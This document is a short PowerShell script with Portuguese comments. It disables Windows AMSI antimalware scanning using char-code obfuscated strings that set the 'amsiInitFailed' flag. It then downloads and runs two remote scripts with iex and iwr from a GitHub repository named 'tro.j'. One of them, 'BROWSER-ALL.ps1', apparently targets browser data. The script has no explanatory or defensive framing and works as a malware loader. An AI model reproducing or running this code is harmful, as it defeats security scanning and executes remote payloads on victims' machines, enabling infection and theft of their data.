# Desabilita AMSI usando strings ofuscadas
$t=[Ref].Assembly.GetType(([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]77+[char]97+[char]110+[char]97+[char]103+[char]101+[char]109+[char]101+[char]110+[char]116+[char]46+[char]65+[char]117+[char]116+[char]111+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]46+[char]65+[char]109+[char]115+[char]105+[char]85+[char]116+[char]105+[char]108+[char]115));$t.GetField(([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true)
# Agora executa os payloads
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1' -UseBasicParsing).Content
Start-Sleep 3
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1' -UseBasicParsing).Content
